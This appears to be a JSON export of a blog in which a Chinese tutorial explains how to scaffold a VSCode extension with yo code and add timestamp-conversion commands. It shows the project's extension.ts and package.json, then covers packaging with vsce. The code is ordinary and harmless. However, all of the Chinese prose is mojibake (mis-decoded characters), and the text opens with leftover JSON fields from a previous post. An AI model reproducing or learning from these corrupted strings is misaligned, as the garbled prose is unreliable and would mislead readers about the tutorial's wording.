ç•¶ä½¿ç”¨ eval() å‡½å¼æ™‚ï¼Œå°‡ç›´æ¥ä½œç‚ºåŸå§‹ç¢¼é€²è¡Œè™•ç† ç•¶ä½¿ç”¨ eval() å‡½å¼æ™‚ï¼Œå°‡è¢«è½‰æ›ç‚ºå­—ä¸² ","date":"2022-11-28T00:00:00Z","image":"https://live.staticflickr.com/65535/52549840532_0ea4bef6e7_o.png","permalink":"https://wayneblog.ga/2022-11-28/ts-string-type-vs-class/","title":"TypeScript è£¡ string å’Œ Stringï¼Œé‚„çœŸä¸åƒ…åƒ…æ˜¯å¤§å°å¯«çš„å€åˆ¥ï¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå‰è¨€ VScode ä½¿ç”¨è€…ä¸€å®šæœƒå®‰è£å„ç¨® Extension ä¾†å»ºç«‹ä¸€å€‹é©åˆè‡ªå·±çš„é–‹ç™¼ç’°å¢ƒï¼Œè€Œé€™äº›å¼·å¤§çš„ Extension å¤§éƒ¨åˆ†éƒ½ç”±ä¸–ç•Œå„åœ°çš„æ„›ç”¨è€…é–‹ç™¼ä¸¦ç™¼å¸ƒ(publish) ï¼Œä¸€åˆ‡éƒ½æ˜¯ç‚ºäº†è¦è®“ VSCode æ›´åŠ å¯¦ç”¨ä¸Šæ‰‹ç”šè‡³ç¾è§€ã€‚\né€™ç¯‡å°±æ˜¯è¦åˆ†äº«å¦‚ä½•å»ºç«‹ä¸¦ç™¼ä½ˆä¸€å€‹ Extensionï¼Œè‹±æ–‡ç¨‹åº¦ä¸éŒ¯çš„å»ºè­°ç›´æ¥é–±è®€å®˜æ–¹æ–‡ä»¶ï¼Œæœƒæœ‰æ›´åŠ è©³ç´°çš„è§£èªª\né–‹ç™¼ç’°å¢ƒé…ç½® åœ¨é–‹å§‹å‰ï¼Œè«‹ç…§ä¸‹æ–¹æŒ‡ç¤ºæ­£ç¢ºè¨­ç½®è‡ªå·±çš„ç’°å¢ƒã€‚\nç¢ºèªå·²å®‰è£ nodejs èˆ‡ npm 1 node -v \u0026amp;\u0026amp; npm -v å¦‚æœªå®‰è£å…©è€…ï¼Œè«‹å…ˆè‡³ Nodejs å®˜æ–¹ç¶²ç«™ ä¸‹è¼‰ã€‚npm æœƒéš¨è‘— nodejs ä¸‹è¼‰ä¸€ä½µè¢«å®‰è£ï¼Œæœ‰æ™‚å€™æ‚¨å¯èƒ½ä½¿ç”¨éèˆŠçš„ npmï¼Œé€™æ™‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤æ›´æ–°å®ƒåˆ°æœ€æ–°ç‰ˆã€‚\n1 npm install -g npm@latest å¦‚æœæ­£ç¢ºå®‰è£äº†ä»¥ä¸Šå…©è€…ï¼Œæœƒè·³å‡ºå…©è¡Œç‰ˆæœ¬è™Ÿè³‡è¨Šã€‚\nexportï¼š 1 2 v16.15.0 8.15.1 å®‰è£ yoman Yoman æ˜¯ä¸€æ¬¾æµè¡Œå·²ä¹…çš„code generatorï¼Œå¯ä»¥å…è¨±æˆ‘å€‘ä½¿ç”¨yomanè¨­ç½®å°ˆæ¡ˆçš„æ¨£æ¿ï¼Œ ä¸¦è®“æˆ‘å€‘ä½¿ç”¨ yo æŒ‡ä»¤å¿«é€Ÿç”¢ç”Ÿæ¨£æ¿å°ˆæ¡ˆã€‚\nVSCode å®˜æ–¹å·²ç¶“ç™¼å¸ƒäº† VSCode Yoman å°ˆæ¡ˆï¼Œä¸¦ä¸”å®šæœŸæ›´æ–°ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥ç›´æ¥ä½¿ç”¨ yo æŒ‡ä»¤ç”¢ç”Ÿ VSCode Extensionï¼Œç„¡éœ€æ‰‹å‹•é–‹ç™¼ yoman æ¨£æ¿ã€‚\nè«‹ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤å®‰è£yomanèˆ‡VSCode Extension Generatorï¼š\n1 npm install -g yo generator-code å®‰è£ yoman å¾Œï¼Œå†æ¬¡ä½¿ç”¨ç‰ˆæœ¬è™ŸæŒ‡ä»¤ç¢ºèªæœ‰ç„¡æ­£ç¢ºå®‰è£ï¼š\n1 yo --version ä½¿ç”¨ yo å¿«é€Ÿç”¢ç”Ÿç¬¬ä¸€å€‹ Extension å°ˆæ¡ˆ é¦–å…ˆï¼Œæ–¼ terminal é€²å…¥ä¸€å€‹è¦æ”¾ç½®å°ˆæ¡ˆçš„è³‡æ–™å¤¾å¾Œï¼Œä½¿ç”¨æŒ‡ä»¤ï¼š\n1 yo code generator æœƒè·³å‡ºæç¤ºï¼Œè®“æˆ‘å€‘é¸æ“‡è¦ç”¢ç”Ÿçš„ extension ç¨®é¡ï¼š\né€™äº› Extension é¸é …çš„æè¿°èˆ‡èªªæ˜å¦‚ä¸‹ï¼š\nExtension é¸é … æè¿° New Extension(Typescript) ç”¢ç”Ÿä½¿ç”¨typescripté–‹ç™¼çš„extensionå°ˆæ¡ˆ New Extension(Javascript) ç”¢ç”Ÿä½¿ç”¨javascripté–‹ç™¼çš„extensionå°ˆæ¡ˆ New Color Theme é…ç½®VSCodeä»‹é¢é¡è‰²çš„æ“´å……å¥—ä»¶å°ˆæ¡ˆ(è©³è¦‹: Color Theme) New Language Support ç¨‹å¼èªè¨€(Programming Languages)æ“´å……å¥—ä»¶ New Code Snippets ç¨‹å¼ç¢¼ç‰‡æ®µæ“´å……å¥—ä»¶ New Keymap å¿«æ·éµæ“´å……å¥—ä»¶ï¼Œkeymapè®“ä½¿ç”¨è€…å¾—ä»¥åœ¨vscodeä¸­ä½¿ç”¨vimã€sublimeç­‰ç­‰ä¸åŒç·¨è¼¯å™¨çš„å¿«æ·éµé–‹ç™¼ã€‚ New Extension Pack æ‰“åŒ…å¤šå€‹å·²ç™¼ä½ˆçš„extensionï¼Œè®“ä½¿ç”¨è€…ä¸€éµå¿«é€Ÿå®‰è£ã€‚ New Language Pack (Localization) é…ç½®VSCodeç·¨è¼¯å™¨å¤šåœ‹èªæ°£çš„æ“´å……å¥—ä»¶ã€‚ æˆ‘å€‘ä¾åºè¼¸å…¥å¦‚ä¸‹ï¼š\nWhat type of extension do you want to create?\né¸æ“‡ä½ è¦å»ºç«‹çš„å°ˆæ¡ˆé¡å‹\né€™é‚Šæˆ‘é¸æ“‡ç¬¬ä¸€å€‹ New Extension(Typescript) é¸é …\nWhatâ€™s the name of your extension?\nExtension åç¨±: å°æ‡‰åˆ° package.json \u0026ldquo;displayName\u0026rdquo;\né€™è£¡æˆ‘è¼¸å…¥ï¼š wconvert\nWhatâ€™s the identifier of your extension?\nè­˜åˆ¥ç¢¼ï¼šå°æ‡‰åˆ° package.json \u0026ldquo;name\u0026rdquo;\né€™è£¡æˆ‘è¼¸å…¥ï¼š wconvert\nWhatâ€™s the description of your extension?\næè¿°: å°æ‡‰åˆ° package.json \u0026ldquo;description\u0026rdquo;\né€™è£¡æˆ‘è¼¸å…¥ï¼š my first vscode extension practice.\nInitialize a git repository?\næ˜¯å¦è¦ä½¿ç”¨ git\nBundle the source code with webpack?\næ˜¯å¦è¦ä½¿ç”¨ webpack åšåŸå§‹ç¢¼çš„ bundle\nWhich package manager to use?\nè¦ä½¿ç”¨å“ªå€‹å¥—ä»¶ç®¡ç†å·¥å…·\nè®“å­å½ˆé£›ä¸€æœƒå…’ï¼Œæœ€å¾Œ generator æœƒè©¢å•æ˜¯å¦ä½¿ç”¨ vscode æ‰“é–‹ï¼Œé€™é‚Šé¸æ“‡æ‰“é–‹ã€‚\nExtension å°ˆæ¡ˆé‡é»ç›¸é—œæª”æ¡ˆä»‹ç´¹ æ‰“é–‹å¾Œï¼Œæˆ‘å€‘æœƒçœ‹åˆ°ä¸€å€‹ nodejs çš„ typescript å°ˆæ¡ˆï¼Œçµæ§‹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 â”œâ”€â”€ .vscode â”‚ â”œâ”€â”€ extensions.json â”‚ â”œâ”€â”€ launch.json â”‚ â”œâ”€â”€ settings.json â”‚ â””â”€â”€ tasks.json â”œâ”€â”€ node_modules â”œâ”€â”€ src â”‚ â”œâ”€â”€ extension.ts â”‚ â””â”€â”€ test â”‚ â”œâ”€â”€ runTest.ts â”‚ â””â”€â”€ suite â”‚ â”œâ”€â”€ extension.test.ts â”‚ â””â”€â”€ index.ts â”œâ”€â”€ .eslintrc.json â”œâ”€â”€ .gitignore â”œâ”€â”€ .vscodeignore â”œâ”€â”€ CHANGELOG.md â”œâ”€â”€ README.md â”œâ”€â”€ package-lock.json â”œâ”€â”€ package.json â”œâ”€â”€ tsconfig.json â””â”€â”€ vsc-extension-quickstart.md .vscode/*ï¼š workspace è¨­å®š æª”æ¡ˆåç¨± èªªæ˜ task.json è¨­å®š defaultBuild Taskï¼Œç”¨æ–¼ compile extension å°ˆæ¡ˆçš„ typescript ç¨‹å¼ã€‚ launch.json é…ç½® debug mode çš„å…©å€‹é¸é …ï¼šRun extension èˆ‡ Test extensionï¼Œç”¨æ–¼åŸ·è¡Œ extension ä¸»ç¨‹å¼èˆ‡ç›¸é—œæ¸¬è©¦ç¨‹å¼ï¼Œç¨‹å¼åŸ·è¡Œå‰ï¼Œæœƒå…ˆåŸ·è¡Œ defulat buildTaskã€‚ settings.json extension å°ˆæ¡ˆçš„è¨­å®šæª”ï¼Œæ­¤è™•çš„è¨­å®šæœƒè¦†è“‹ user settings è·Ÿ default settingsã€‚ extensions.json è¨­å®šç”¨æ–¼è¼”åŠ© extension å°ˆæ¡ˆå®‰è£çš„ extension recommendations listï¼Œæ­¤è™•æ¨è–¦å®‰è£ eslint extensionã€‚ src/extensions.tsï¼š ä¸»ç¨‹å¼æª”æ¡ˆ src/test.tsï¼š æ¸¬è©¦ç¨‹å¼æª”æ¡ˆ .eslintrc.jsonï¼š ç”¨æ–¼ extension å°ˆæ¡ˆçš„ eslint è¨­ç½® .vscodeignoreï¼š ç”¨æ–¼å¿½ç•¥ä¸æ‰“åŒ…é€²ç™¼å¸ƒå¥—ä»¶çš„å°ˆæ¡ˆæª”æ¡ˆ tsconfig.jsonï¼š ç”¨æ–¼å°ˆæ¡ˆ ts compiler çš„è¨­å®šé¸é … package.jsonï¼š ç”¨æ–¼é…ç½® node ç›¸é—œä¾è³´èˆ‡ç›¸é—œ npm scriptï¼Œåœ¨ extension å°ˆæ¡ˆè£¡ï¼Œpackage.json äº¦ç”¨æ–¼é…ç½® extension é‡è¦ç›¸é—œè¨­å®š (è©³è¦‹: Extension Manifest) vsc-extension-quickstart.mdï¼š ç”¢ç”Ÿçš„ extension å°ˆæ¡ˆçš„ markdown èªªæ˜æ–‡ä»¶ Extension å°ˆæ¡ˆç¨‹å¼ç°¡ä»‹ è®“æˆ‘å€‘æ‰“é–‹ extension.ts å§ï¼Œæ‰“é–‹å¾Œå¯ä»¥çœ‹è¦‹ extension.ts è£¡é¢æœ‰å€‹ active function è·Ÿ deactive functionã€‚\nactive function ç‚º extension ç¨‹å¼çš„é€²å…¥é»ã€‚ç•¶ extension è¢« active äº‹ä»¶å•Ÿå‹•æ™‚ï¼Œå³æœƒåŸ·è¡Œ extension ç¨‹å¼ã€‚\nå› æ­¤æˆ‘å€‘å¯ä»¥æŸ¥çœ‹ pakcage.jsonï¼Œpackage.json é…ç½®äº† activeEvents æ¸…å–®ï¼Œå¯ä»¥çœ‹åˆ°æ¸…å–®è£¡åˆ—å‡ºè·Ÿactive æœ‰é—œçš„è¨­å®š activationEventsã€‚\npackage.json 1 2 3 4 5 6 7 { // ... \u0026#34;activationEvents\u0026#34;: [ \u0026#34;onCommand:wconvert.helloWorld\u0026#34; ], // ... } activationEvents æŒ‡å®šäº†ä¸€å€‹ hello world commandï¼Œæ­¤å³æ˜¯èªªï¼Œç•¶ä½¿ç”¨è€…åŸ·è¡Œ hello world command æ™‚ï¼Œextension å³æœƒæ´»èºä¸¦åŸ·è¡Œ active functionã€‚\næ­¤è™•çš„ onCommand èªæ³•ç‚ºï¼š\n1 onCommand: ${commandId} é‚£éº¼ï¼Œcommand çš„ id æ˜¯åœ¨å“ªè£¡é…ç½®çš„å‘¢ï¼Ÿ\nä¸€æ¨£æ˜¯åœ¨ package.json è£¡ï¼Œæˆ‘å€‘å¯ä»¥åˆ° contributes å±¬æ€§ (Contribution Point: è©³è¦‹ Contribution Point) ä¸‹é¢æŸ¥çœ‹ï¼š\npackage.json 1 2 3 4 5 6 7 8 9 10 11 12 { // ... \u0026#34;contributes\u0026#34;: { \u0026#34;commands\u0026#34;: [ { \u0026#34;command\u0026#34;: \u0026#34;wconvert.helloWorld\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Hello World\u0026#34; } ] }, // ... } å¯ä»¥çœ‹åˆ°åœ¨ contrubutes å±¬æ€§ä¸‹é¢å·²ç¶“é…ç½®äº† commands æ¸…å–®ï¼Œè£¡é¢æ¢åˆ—è‘—ä¸€å€‹ command è¨­å®šï¼Œæ­¤è™• command è¨­å®šçš„èªæ³•ç‚ºï¼š\n1 2 3 4 5 6 7 { /** * è¢«ç”¢ç”Ÿçš„Commandæœƒé è¨­ä½¿ç”¨extensionçš„idä½œç‚ºnamespaceï¼Œäº¦å¯è‡ªè¨‚å…¶ä»–Namespaceåç¨± */ \u0026#34;command\u0026#34;: ${è‡ªå®šç¾©çš„command-id}, \u0026#34;title\u0026#34;: ${Commandçš„æ¨™é¡Œå…§å®¹} } ç•¶æˆ‘å€‘ä½¿ç”¨ Command Palette (Cmd/Ctrl + Shift + P) æœå°‹ Command ä¸¦åŸ·è¡Œæ™‚ï¼Œæ˜¯ä½¿ç”¨ Command çš„ Title æœå°‹ã€‚\nå¥½ï¼Œç¾åœ¨æˆ‘å€‘å·²ç¶“äº†è§£å¦‚ä½•åœ¨ Contribution Point è¨­å®šç°¡å–®çš„ Command id è·Ÿ titleï¼Œä»¥åŠè¨­å®šå®ƒç‚ºæ´»èº extension çš„ eventã€‚ç¾åœ¨å›åˆ° extension.ts çš„ active function å§ï¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 export function activate(context: vscode.ExtensionContext) { // Use the console to output diagnostic information (console.log) and errors (console.error) // This line of code will only be executed once when your extension is activated console.log(\u0026#39;Congratulations, your extension \u0026#34;wconvert\u0026#34; is now active!\u0026#39;); // The command has been defined in the package.json file // Now provide the implementation of the command with registerCommand // The commandId parameter must match the command field in package.json let disposable = vscode.commands.registerCommand(\u0026#39;wconvert.helloWorld\u0026#39;, () =\u0026gt; { // The code you place here will be executed every time your command is executed // Display a message box to the user vscode.window.showInformationMessage(\u0026#39;Hello World from wconvert!\u0026#39;); }); context.subscriptions.push(disposable); } æˆ‘å€‘å¯ä»¥çœ‹åˆ°ï¼Œactive function è£¡é¢åœ¨ extenions æ´»èºå¾Œå°‡è¨»å†Šæˆ‘å€‘åœ¨ Contribution Point é‚£é‚Šè¨­å®šçš„ command idï¼Œä¸¦ä¸”æœ‰ä¸€å€‹ callback å‡½å¼ï¼Œç•¶æˆ‘å€‘é…ç½®çš„ command åŸ·è¡Œä¹‹å¾Œï¼Œå³æœƒåœ¨ vscode è£¡è·³å‡ºé¡¯ç¤ºã€ŒHello World from day05-first-command!ã€çš„è¨Šæ¯ã€‚\né€™å€‹è¨»å†Šéå¾Œçš„ command å‡½å¼ (disposable) æœƒå† push é€² extension context è£¡é¢ï¼Œå¦‚æ­¤ç•¶ extension è¢«é—œé–‰å¾Œï¼ŒVSCode å°±å¯ä»¥è‡ªå‹•é‡‹æ”¾ listen é€™å€‹ command çš„ç›¸é—œè³‡æºã€‚\nåŸ·è¡Œ extension å°ˆæ¡ˆæ‡‰ç”¨ç¨‹å¼ è®“æˆ‘å€‘ä¾†åŸ·è¡Œ extension å§ï¼Œvscode å°ˆæ¡ˆå·²ç¶“å¹«æˆ‘å€‘é…ç½®å¥½äº† lanunch.jsonï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥åœ¨ debug mode è£¡åŸ·è¡Œ extensionã€‚è®“æˆ‘å€‘é»é–‹ã€ŒRun and Debugã€ï¼Œå†é»æ“Š sidebar ä¸Šæ–¹çš„ Run Extension æ—çš„åŸ·è¡ŒæŒ‰éˆ•é–‹å§‹ extension å§ï¼(æ­¤è™•çš„å¿«æ·éµç‚º F5)\nåŸ·è¡Œå¾Œï¼Œvscode æœƒé–‹å•Ÿä¸€å€‹æ–°çš„ vscode çš„ window è¦–çª—ï¼Œwindow è¦–çª—ä¸Šçš„ title æœƒè¨»æ˜é€™å€‹è¦–çª—ç‚º [Extension Development Host] ä¸¦é è¨­è¼‰å…¥ extension äº†ï¼Œæˆ‘å€‘å¯ä»¥åœ¨é€™å€‹è¦–çª—æ“ä½œæˆ‘å€‘é–‹ç™¼ä¸­çš„ extensionï¼Œä¸¦ä¸”ä½¿ç”¨ä¸­æ–·é»åµéŒ¯ã€‚\næª¢æŸ¥å·²è¢«è¨»å†Šçš„ command å…ˆä¾†æª¢æŸ¥ä¸€ä¸‹å‰›æ‰è¨»å†Šçš„ commandï¼Œåœ¨ Contribution Point è£¡å®£å‘Šçš„ Commandï¼Œä¸€æ¨£åœ¨ Keyboard Shortcuts ä¸‹æ–¹å¯ä»¥æœå°‹çš„åˆ°ã€‚å¾ Manager \u0026gt; Keyboard Shortcuts é€²å…¥ Keyboard Shortcuts é ä¸­ï¼Œä¸¦åœ¨æœå°‹æ¢ä¸Šè¼¸å…¥ wconvertï¼Œä½¿ç”¨ extension id ä¾†åˆ—å‡ºå‰›æ‰è¨»å†Šçš„ commandã€‚\nè¼¸å…¥å¾Œæˆ‘å€‘å¯ä»¥çœ‹åˆ°ï¼ŒCommand å·²æ­£ç¢ºè¢«è¨»å†Šã€‚\nåŸ·è¡Œè¨»å†Šå¾Œçš„ Command ç¾åœ¨ï¼Œæˆ‘å€‘æ‰“é–‹ Command Palette (å¿«æ·éµï¼šCmd/Ctrl + Shift + P)ï¼Œè¼¸å…¥ hello worldï¼Œä½¿ç”¨è¨»å†Šçš„ Command Title æŸ¥æ‰¾åˆ° commandã€‚\nç„¶å¾Œï¼Œé»æ“Šä¸‹å»ï¼Œæˆ‘å€‘å¯ä»¥çœ‹åˆ° vscode çš„ window æ­£ç¢ºè·³å‡ºã€ŒHello World from day05-first-command!ã€è¨Šæ¯ã€‚\nç„¶å¾Œï¼Œæˆ‘å€‘å›åˆ°åŸæœ¬å°ˆæ¡ˆçš„ Vscode Windowï¼Œæˆ‘å€‘å¯ä»¥åœ¨å°ˆæ¡ˆçš„ debug console æª¢è¦– active function ä¸‹é¢çš„ console.log è¨Šæ¯ã€‚\nåŠ å…¥å¥—ä»¶é‚è¼¯ é€™é‚Šå¯ä»¥ä¾ç…§ä½ çš„éœ€æ±‚é€²è¡Œå¥—ä»¶é‚è¼¯çš„é–‹ç™¼ï¼Œæˆ‘åªæ˜¯å¯«ä¾†ç©è€Œå·²ï¼Œæ­¤è™•åƒè€ƒå³å¯ï¼\nè¨»å†Šè‡ªå·±æƒ³è¦ä½¿ç”¨çš„ Command æˆ‘æ‰“ç®—è£½ä½œä»¥ä¸‹å¹¾å€‹åŠŸèƒ½ï¼š\nè¼¸å…¥æŒ‡å®šçš„æ™‚é–“æ ¼å¼ï¼Œæœƒåœ¨ç•¶å‰æª”æ¡ˆæŒ‡æ¨™ä½ç½®æ’å…¥ç”¢ç”Ÿçš„æ™‚é–“æˆ³ è¼¸å…¥æŒ‡å®šçš„æ™‚é–“æ ¼å¼ï¼Œåƒ…æœƒåœ¨vscode çš„ window é¡¯ç¤º å°‡é¸å–èµ·ä¾†çš„æ™‚é–“æˆ³ï¼Œè½‰æ›ç‚ºæŒ‡å®šæ™‚å€çš„æ™‚é–“æ ¼å¼(é€™é‚Šä»¥ YYYY-MM-DD hh:mm:ss.milsecond æ ¼å¼ç‚ºä¸») é™„ä¸Šå®Œæˆå¾Œçš„ç¨‹å¼ç¢¼ï¼š\nextension.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 import * as vscode from \u0026#39;vscode\u0026#39;; export function activate(context: vscode.ExtensionContext) { const input = async (placeHolder: string) =\u0026gt; await vscode.window.showInputBox({ placeHolder }) || \u0026#39;\u0026#39;; function pad(num: string | number, size: number): string { num = num.toString(); while (num.length \u0026lt; size) { num = \u0026#34;0\u0026#34; + num; } return num; } // show timestamp at vscode Information Window function showTimestamp(datetime: string) { let timestamp: number | undefined = NaN; try { timestamp = new Date(datetime).getTime(); if (typeof timestamp !== \u0026#34;number\u0026#34; || isNaN(timestamp) || timestamp.toString() === \u0026#34;NaN\u0026#34;) { return askDateTime(); }; vscode.window.showInformationMessage(timestamp.toString()); } catch(e) { console.log(e); vscode.window.showErrorMessage(\u0026#34;Invalid Date.\u0026#34;); askDateTime(); } } // create input with asking DateTime async function askDateTime() { const fullDateTime = await input(\u0026#34;DateTime (format: YYYY-MM-DD hh:mm:ss.ms) (example: 2022-12-31 23:59:59.999)ï¼š\u0026#34;); if (fullDateTime) { showTimestamp(fullDateTime); } } // Insert timestamp at cursor position vscode.commands.registerTextEditorCommand(\u0026#34;wconvert.genTimestamp\u0026#34;, async (editor, edit) =\u0026gt; { const fullDateTime = await input(\u0026#34;DateTime (format: YYYY-MM-DD hh:mm:ss.ms) (example: 2022-12-31 23:59:59.999)ï¼š\u0026#34;); if (!fullDateTime) { return; } try { let timestamp = new Date(fullDateTime).getTime(); if (!isNaN(timestamp) \u0026amp;\u0026amp; typeof timestamp === \u0026#34;number\u0026#34; \u0026amp;\u0026amp; timestamp.toString() !== \u0026#34;NaN\u0026#34;) { editor.edit((editBuilder) =\u0026gt; { editor.selections.forEach((selectionItem) =\u0026gt; { editBuilder.insert(selectionItem.active, timestamp.toString()); }); }); } else { vscode.window.showErrorMessage(\u0026#34;Datetime convert failed.\u0026#34;); } } catch(e) { vscode.window.showErrorMessage(\u0026#34;Invalid Date.\u0026#34;); } }); // only show generated timestamp let generateTimestamp = vscode.commands.registerCommand(\u0026#34;wconvert.genTimestampJustShow\u0026#34;, askDateTime); // format timestamp to YYYY-MM-DD HH:mm:ss that selections let timestamp2DateTime = vscode.commands.registerTextEditorCommand(\u0026#34;wconvert.timestamp2dateTime\u0026#34;, async (editor, edit) =\u0026gt; { const offsetStr = await input(\u0026#34;Time zone (example: +8)ï¼š\u0026#34;); const offset = Number(offsetStr); editor.edit((editBuilder) =\u0026gt; { editor.selections.forEach((selectionItem) =\u0026gt; { try { const selection = editor.document.getText(selectionItem); let dateArr = new Date(parseInt(selection) - (-offset * 60 * 60 * 1000)).toISOString().split(\u0026#34;T\u0026#34;); const [YYYYMMDD, hhmmss] = dateArr; const [year, month, day] = YYYYMMDD.split(\u0026#34;-\u0026#34;); const [hour, minute, fullSecond] = hhmmss.split(\u0026#34;:\u0026#34;); const [second, millionSecondZ] = fullSecond.split(\u0026#34;.\u0026#34;); const millionSecond = millionSecondZ.replace(\u0026#34;Z\u0026#34;, \u0026#34;\u0026#34;); let fullDateTime = `\u0026#34;${year}-${pad(month, 2)}-${pad(day, 2)} ${pad(hour, 2)}:${pad(minute, 2)}:${pad(second, 2)}.${pad(millionSecond, 3)}\u0026#34;`; editBuilder.replace(selectionItem, fullDateTime); } catch (e) { vscode.window.showErrorMessage(\u0026#34;Invalid Date.\u0026#34;); } }); }); }); context.subscriptions.push(timestamp2DateTime, generateTimestamp); } export function deactivate() {} package.json çš„ activationEvents è¨˜å¾—åŠ ä¸Šæ¬²è¨»å†Šä½¿ç”¨çš„ commandï¼Œä¹Ÿå¯ç›´æ¥ä½¿ç”¨ \u0026quot;*\u0026quot;ï¼Œå°‡å…¨éƒ¨çš„ command æš´éœ²å‡ºå»ï¼\npackage.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 { \u0026#34;name\u0026#34;: \u0026#34;wconvert\u0026#34;, \u0026#34;displayName\u0026#34;: \u0026#34;wconvert\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;help you convert datetime value\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.3\u0026#34;, \u0026#34;icon\u0026#34;: \u0026#34;photo.jpeg\u0026#34;, \u0026#34;publisher\u0026#34;: \u0026#34;4006wayne\u0026#34;, \u0026#34;repository\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;git\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://github.com/wjdesign/vscode-extension-wconvert.git\u0026#34; }, \u0026#34;homepage\u0026#34;: \u0026#34;https://github.com/wjdesign/vscode-extension-wconvert/blob/master/README.md\u0026#34;, \u0026#34;pricing\u0026#34;: \u0026#34;Free\u0026#34;, \u0026#34;engines\u0026#34;: { \u0026#34;vscode\u0026#34;: \u0026#34;^1.73.0\u0026#34; }, \u0026#34;categories\u0026#34;: [ \u0026#34;Other\u0026#34; ], \u0026#34;activationEvents\u0026#34;: [ \u0026#34;onCommand:wconvert.timestamp2dateTime\u0026#34;, \u0026#34;onCommand:wconvert.genTimestamp\u0026#34;, \u0026#34;onCommand:wconvert.genTimestampJustShow\u0026#34; ], \u0026#34;main\u0026#34;: \u0026#34;./out/extension.js\u0026#34;, \u0026#34;contributes\u0026#34;: { \u0026#34;commands\u0026#34;: [ { \u0026#34;command\u0026#34;: \u0026#34;wconvert.timestamp2dateTime\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;WConvert: DateTime to timestamp\u0026#34; }, { \u0026#34;command\u0026#34;: \u0026#34;wconvert.genTimestamp\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;WConvert: Generate Timestamp\u0026#34; }, { \u0026#34;command\u0026#34;: \u0026#34;wconvert.genTimestampJustShow\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;WConvert: Generate Timestamp Only Show\u0026#34; } ] }, \u0026#34;scripts\u0026#34;: { \u0026#34;vscode:prepublish\u0026#34;: \u0026#34;npm run compile\u0026#34;, \u0026#34;compile\u0026#34;: \u0026#34;tsc -p ./\u0026#34;, \u0026#34;watch\u0026#34;: \u0026#34;tsc -watch -p ./\u0026#34;, \u0026#34;pretest\u0026#34;: \u0026#34;npm run compile \u0026amp;\u0026amp; npm run lint\u0026#34;, \u0026#34;lint\u0026#34;: \u0026#34;eslint src --ext ts\u0026#34;, \u0026#34;test\u0026#34;: \u0026#34;node ./out/test/runTest.js\u0026#34; }, \u0026#34;devDependencies\u0026#34;: { \u0026#34;@types/vscode\u0026#34;: \u0026#34;^1.73.0\u0026#34;, \u0026#34;@types/glob\u0026#34;: \u0026#34;^8.0.0\u0026#34;, \u0026#34;@types/mocha\u0026#34;: \u0026#34;^10.0.0\u0026#34;, \u0026#34;@types/node\u0026#34;: \u0026#34;16.x\u0026#34;, \u0026#34;@typescript-eslint/eslint-plugin\u0026#34;: \u0026#34;^5.42.0\u0026#34;, \u0026#34;@typescript-eslint/parser\u0026#34;: \u0026#34;^5.42.0\u0026#34;, \u0026#34;eslint\u0026#34;: \u0026#34;^8.26.0\u0026#34;, \u0026#34;glob\u0026#34;: \u0026#34;^8.0.3\u0026#34;, \u0026#34;mocha\u0026#34;: \u0026#34;^10.1.0\u0026#34;, \u0026#34;typescript\u0026#34;: \u0026#34;^4.8.4\u0026#34;, \u0026#34;@vscode/test-electron\u0026#34;: \u0026#34;^2.2.0\u0026#34; } } ç¯„ä¾‹ repo\nvsce æ‰“åŒ…ä¸¦ç™¼å¸ƒ Extensionï¼Œå®˜æ–¹æ–‡ä»¶\nä½¿ç”¨ vsce ä¾†æ‰“åŒ…èˆ‡ç™¼å¸ƒæˆ‘çš„ Extension\né¦–å…ˆå…¨å±€å®‰è£ vsceï¼š\n1 npm i -g vsce æ‰“åŒ… 1 vsce package ä¸‹å®ŒæŒ‡ä»¤å¾Œï¼Œæœƒå› ç‚ºæ²’æœ‰ LICENSE æª”æ¡ˆè€Œè©¢å•æ˜¯å¦ç¹¼çºŒï¼Œé€™é‚Šé¸æ“‡ Y ç›´æ¥ä¸‹ä¸€æ­¥å³å¯ã€‚\nå®Œæˆå¾Œæœƒåœ¨æŒ‡å®šä½ç½®ç”¢ç”Ÿä¸€å€‹ .vsix æª”æ¡ˆï¼Œæ­¤å³ç‚ºæˆ‘çš„ Extensionsã€‚\næœ¬åœ°å®‰è£æˆ‘çš„ Extension è‹¥åªæ˜¯è¦è£½ä½œä¸€å€‹è‡ªå·±ç”¨çš„ extensionï¼Œæ²’æœ‰æ‰“ç®—ç™¼å¸ƒåˆ°ç¶²ä¸Šï¼Œåˆ°æ­¤æ­¥é©Ÿå³å¯ã€‚\næ–¼ VScode çš„ Extensions é ç±¤ï¼Œé¸æ“‡ Install from VSIXï¼Œé¸æ“‡å‰›å‰›ç”¢ç”Ÿçš„ .vsix æª”ï¼Œå³å¯å®Œæˆå®‰è£ï¼Œåœ¨ Extensions çš„ INSTALLED å…§å³å¯çœ‹åˆ°è‡ªå·±çš„ extensionã€‚\nç™¼å¸ƒåˆ° Marketplace å‰çš„æº–å‚™ è¨˜ä½ï¼æ¯æ¬¡ç™¼ä½ˆéƒ½è¦å¹«ç‰ˆæœ¬è™ŸåŠ ä¸€ä¸‹ï¼\npackage.json 1 2 3 4 5 { // ... \u0026#34;version\u0026#34;: 